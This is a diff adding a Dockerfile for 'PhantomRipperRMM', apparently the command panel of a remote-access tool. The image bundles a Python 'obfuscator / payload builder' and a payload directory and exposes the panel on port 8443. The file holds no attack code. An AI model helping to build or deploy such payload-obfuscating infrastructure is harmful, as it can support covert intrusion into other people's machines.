@@ -1,0 +1,39 @@
+# PhantomRipperRMM — panel image.
+# Node 24 (for the built-in node:sqlite) + Python 3 (for the payload builder).
+# Base pulled from the AWS ECR Public mirror of Docker Hub's official images to
+# avoid Docker Hub anonymous-pull rate limits (429) on shared builders.
+FROM public.ecr.aws/docker/library/node:24-bookworm-slim
+
+# Python for the obfuscator / payload builder. No native build tooling needed
+# (node:sqlite is built into Node — no better-sqlite3 compile step).
+RUN apt-get update && apt-get install -y --no-install-recommends \
+      python3 python3-pip ca-certificates \
+    && rm -rf /var/lib/apt/lists/*
+
+WORKDIR /app
+
+# Install server deps first (layer caching).
+COPY panel/server/package.json ./panel/server/package.json
+RUN cd panel/server && npm install --omit=dev
+
+# Copy the rest.
+COPY panel ./panel
+COPY payloads ./payloads
+
+# Runtime data dir.
+RUN mkdir -p /app/panel/server/data/builds
+
+ENV NODE_ENV=production \
+    PORT=8443 \
+    HOST=0.0.0.0 \
+    PYTHON_BIN=python3 \
+    PAYLOAD_DIR=/app/payloads \
+    BUILD_DIR=/app/panel/server/data/builds \
+    DB_PATH=/app/panel/server/data/phantomripper.db
+
+EXPOSE 8443
+
+HEALTHCHECK --interval=30s --timeout=5s --start-period=15s --retries=3 \
+  CMD node -e "require('http').get('http://127.0.0.1:'+(process.env.PORT||8443)+'/api/health',r=>process.exit(r.statusCode===200?0:1)).on('error',()=>process.exit(1))"
+
+CMD ["node", "panel/server/src/index.js"]
